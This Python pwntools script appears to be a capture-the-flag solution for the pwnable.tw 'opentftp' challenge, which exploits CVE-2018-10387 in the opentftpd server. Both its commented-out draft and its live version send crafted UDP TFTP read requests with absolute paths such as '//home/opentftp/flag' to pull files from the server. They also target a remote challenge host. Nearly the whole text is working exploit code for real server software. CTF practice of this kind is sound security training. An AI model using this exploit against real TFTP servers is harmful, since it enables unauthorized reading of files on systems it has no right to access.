# import socket
# # import time
# from pwn import *
# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# binary = './opentftpd'
# # context.log_level='debug'
# def pwn(mode):
# 	if mode == 1:
# 		ip = 'chall.pwnable.tw'
# 		port = "10206"
# 		io = remote(ip, port)
# 		payload = '\x00\x01//home/opentftp/flag\x00netascii\x00'
# 		io.recvuntil('port: ')
# 		port = int(io.recvuntil('\n', drop=True))
# 		info(port)

# 	elif mode == 0:
# 		ip ='127.0.0.1'
# 		port = 12345 
# 		io = process([binary,port],aslr = False)
# 		payload = "\x00\x01//home/ld1ng/pwn/pwnable/CVE-2018-10387/flag\x00netascii\x00"

# 	s.sendto(payload.encode('utf-8'), (ip, port))
# 	ret = s.recv(1024)
# 	print(ret)
# 	return 1
# if __name__ == '__main__':
#     while True:
#         a = pwn(1)
#         if a:
#             break
from pwn import *
#context.log_level = "debug"
binary = "./opentftpd"
e = ELF(binary)
libc = e.libc

MODE = 0
def pwn(MODE):
	if MODE == 0:
		IP = "192.168.182.147"
		PORT = "69"
		r = process([binary,PORT])
		#payload = "\x00\x01ld1ng/pwn/pwnable/CVE-2018-10387/flag\x00netascii\x00"
		payload = "\x00\x01/ld1ng/pwn/pwnable/CVE-2018-10387/flag\x00netascii\x00"
	if MODE == 1:
		r = remote("chall.pwnable.tw",10206)
		r.recvuntil("start challenge on udp port: ")

		IP = "chall.pwnable.tw"
		PORT = int(r.recv(5),10)
		log.info("port : " + str(PORT))
		payload = "\x00\x01//home/opentftp/flag\x00r\x00"
#\x00netascii\x00"

	p = remote(IP,PORT,typ = "udp")
	p.send(payload)

	data = p.recv(1024)
	log.info("flag:" + data)
	return 1
if __name__ == '__main__':
    while True:
        a = pwn(1)
        if a:
            break
